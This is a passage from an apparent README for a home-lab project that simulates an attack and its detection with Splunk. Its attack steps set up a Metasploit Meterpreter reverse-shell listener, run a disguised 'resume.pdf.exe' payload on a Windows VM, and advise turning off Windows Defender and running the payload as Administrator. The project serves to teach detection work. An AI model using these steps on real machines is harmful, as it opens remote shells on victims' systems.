# SOC Home Lab: Attack & Defense Simulation
1. Open Metasploit on Kali:
   ```bash
   msfconsole
   ```
2. Configure the listener:
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST <Attacker_IP>
   set LPORT 4444
   exploit
   ```
3. Deploy `resume.pdf.exe` on Windows 10 and execute it.
4. If successful, you gain a Meterpreter session:
   ```bash
   meterpreter > sysinfo
   ```

---

## Step 6: Monitoring Logs with Splunk

1. Open Splunk and search for unauthorized activity:
   ```
   index=main sourcetype=WinEventLog:Security
   ```
2. Identify anomalies related to unauthorized access.
3. Create alerts to detect suspicious behavior.

---

## 🔍 Troubleshooting

### ❌ Metasploit Handler Not Receiving a Session
- Ensure Windows Defender is **disabled** to prevent blocking the payload.
- Double-check **LHOST and LPORT settings** in both `msfvenom` and `msfconsole`.
- Run the payload on Windows as **Administrator**.

### ❌ Splunk Not Logging Events
- Verify Sysmon is correctly installed and running.
- Ensure Windows Event Logging is enabled in Splunk.
- Restart Splunk and recheck the event index.

---

## 🎯 Next Steps & Future Improvements

✔️ Integrate **ELK Stack** for enhanced log analysis.
✔️ Automate attack execution using **Python scripts**.
✔️ Implement **Wazuh SIEM** for better threat detection.

---

## 🤝 How to Contribute

Interested in improving this project? Contributions are welcome!

1. Fork the repository.
2. Create a new branch with your improvements.
3. Submit a pull request for review.

---

## 🎯 Conclusion

This project demonstrates how to:

- Set up a cybersecurity home lab 🏠
- Deploy and detect malware 🔍
- Use Splunk for threat monitoring ⚠️

> **Note:** This is for educational purposes only. Do not use these techniques for unauthorized activities.

### 📌 Connect with Me:
- [LinkedIn](https://www.linkedin.com/in/wasim-hassan-030b80349/)
